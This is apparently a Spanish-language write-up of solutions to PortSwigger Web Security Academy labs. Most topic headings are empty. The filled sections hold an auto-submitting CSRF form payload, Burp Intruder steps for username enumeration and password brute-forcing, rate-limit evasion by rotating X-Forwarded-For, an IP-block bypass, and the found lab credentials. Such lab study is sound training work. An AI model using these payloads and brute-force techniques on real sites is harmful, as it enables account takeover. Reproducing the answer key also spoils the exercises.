# LABS-Ciberseguridad

## Tabla de contenidos

1. [SQL Injection](#sql-injection)
2. [Cross-site scripting](#cross-site-scripting)
3. [Cross-site request forgery (CSRF)](<#cross-site-request-forgery-(csrf)>)
4. [Clickjacking](#clickjacking)
5. [DOM-based vulnerabilities](#dom-based-vulnerabilities)
6. [Cross-origin resource sharing (CORS)](<#cross-origin-resource sharing-(cors)>)
7. [XML external entity (XXE) injection](<#xml-external-entity-(xxe)-injection>)
8. [Server-side request forgery (SSRF)](<#server-side request-forgery-(ssrf)>)
9. [HTTP request smuggling](#http-request-smuggling)
10. [OS command injection](#os-command-injection)
11. [Server-side template injection](#server-side-template-injection)
12. [Directory traversal](#directory-traversal)
13. [Access control vulnerabilities](#access-control-vulnerabilities)
14. [Authentication](#authentication)
15. [WebSockets](#webSockets)
16. [Web cache poisoning](#web-cache-poisoning)
17. [Insecure deserialization](#insecure-deserialization)
18. [Information disclosure](#information-disclosure)
19. [Business logic vulnerabilities](#business-logic-vulnerabilities)
20. [HTTP Host header attacks](#http-host-header-attacks)

---

## [SQL Injection](https://portswigger.net/web-security/sql-injection)

---

## [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

---

## [Cross-site request forgery (CSRF)](https://portswigger.net/web-security/csrf)

### [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

#### Solución:

```
<form method="POST" action="https://aced1f971f5a2e0d80c321bf00e30015.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="asd@mail.com">
<input type="hidden" name="csrf" value="OQJBSyA28bY0ntWPuDdNcDhU0xN4zavJ">
</form>
<script>
      document.forms[0].submit();
</script>
```

---

## [Clickjacking](https://portswigger.net/web-security/clickjacking)

---

## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)

---

## [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)

---

## [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)

---

## [Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)

---

## [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)

---

## [OS command injection](https://portswigger.net/web-security/os-command-injection)

---

## [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)

---

## [Directory traversal](https://portswigger.net/web-security/file-path-traversal)

---

## [Access control vulnerabilities](https://portswigger.net/web-security/access-control)

---

## [Authentication](https://portswigger.net/web-security/authentication)

### [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)

#### Descripción:

Intentar acceder con los diferentes [usuarios listados](https://portswigger.net/web-security/authentication/auth-lab-usernames) hasta que el mensaje de error sea "Incorrect password" en lugar de "Invalid username".
Una vez que se ha encontrado un usuario válido, probar con las diferentes [contraseñas listadas](https://portswigger.net/web-security/authentication/auth-lab-passwords) hasta lograr acceder. Este proceso se puede automatizar utilizando el intruder de Burp:

1. Hacer una request de login y enviar al intruder.
2. En la pestaña Position seleccionar el ataque de tipo Sniper, parametrizar el usuario y deja fija una contraseña cualquiera.
3. En la pestaña Payload pegar el listado de usuarios e iniciar ataque.
4. Analizar la longitud de la respuesta, identificando aquella de longitud diferente y verificando el cambio en el mensaje de error.
5. En la pestaña Position, dejar fijo el usuario encontrado en el paso anterior y parametrizar la contraseña.
6. En la pestaña Payload pegar el listado de contraseñas e iniciar el ataque.
7. Observar el cambio en el código de respuesta cuando la contraseña es la correcta.
8. Utilizar el usuario y contraseña identificados para iniciar sesión e ir a My account para completar el laboratorio.

#### Solución encontrada:

- Username: att
- Password: 12345

### [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)

#### Descripción:

Repetir los pasos del laboratorio anterior pero en lugar de observar la longitud de la respuesta para el nombre de usuario, identificar el mensaje de error que le falta el punto en "Invalid username or password.". Esto se puede hacer más fácilmente si se extrae el mensaje de error: antes de iniciar el ataque, ir a pestaña Options, en la sección Grep-Extract cliquear en Add y seleccionar con el mouse el contenido de la respuesta que corresponde al mensaje de error. Luego, iniciar el ataque; se mostrará para cada petición el mensaje de error correspondiente, pudiendo identificar rápidamente aquél que es distinto (para ello también se pueden ordenar los resultados por la columna correspondiente al mensaje de respuesta).

#### Solución encontrada:

- Username: appserver
- Password: superman

### [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)

#### Descripción:

Repetir los pasos de los laboratorios anteriores con las siguientes consideraciones:

- Seleccionar pitchfork como tipo de ataque.
- Dejar fija como contraseña una cadena larga de caracteres (100 o más). Esto se debe a que la respuesta es más lenta cuando un usuario es correcto y se debe verificar la contraseña. Cuando más larga es la contraseña, más tarda la respuesta.
- Añadir a la request el header X-Forwarded-For, parametrizando este y el usuario. El propósito de este header es evitar que se bloqueen las reiteradas solicitudes.
- En el payload correspondiente al header, seleccionar un payload de tipo numérico, entre 1 y 100 con step 1 para que se modifique en cada solicitud.
- En los resultados, añadir la columna Response Received e identificar aquella con un tiempo considerablemente mayor. Esta corresponderá a un usuario válido.

#### Solución encontrada:

- Username: admins
- Password: abc123

### [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)

#### Descripción:

El escenario bloquea la IP cuando se producen 3 intentos fallidos de inicio de sesión. Sin embargo, ante un inicio de sesión correcto, ese contador se resetea. Esto se puede utilizar para parametrizar usuario y contraseña de la solicitud, alternando 2 intentos de acceso con el usuario objetivo (carlos) y 1 con nuestro usuario hasta dar con la contraseña correcta.

- [Username payload](https://docs.google.com/document/d/1h_IY5eF4GmU3EV6dkLLCkayMpzhFqMin3IB04nIs654/edit?usp=sharing)
- [Password payload](https://docs.google.com/document/d/1wPU2cm6JWMJATCqWO_UuYEZNrtsBiv-8XncL1denB-0/edit?usp=sharing)

#### Solución encontrada:

- Username: carlos
- Password: george

---

## [WebSockets](https://portswigger.net/web-security/websockets)

---

## [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)

---

## [Insecure deserialization](https://portswigger.net/web-security/deserialization)

---

## [Information disclosure](https://portswigger.net/web-security/information-disclosure)

---

## [Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)

---

## [HTTP Host header attacks](https://portswigger.net/web-security/host-header)
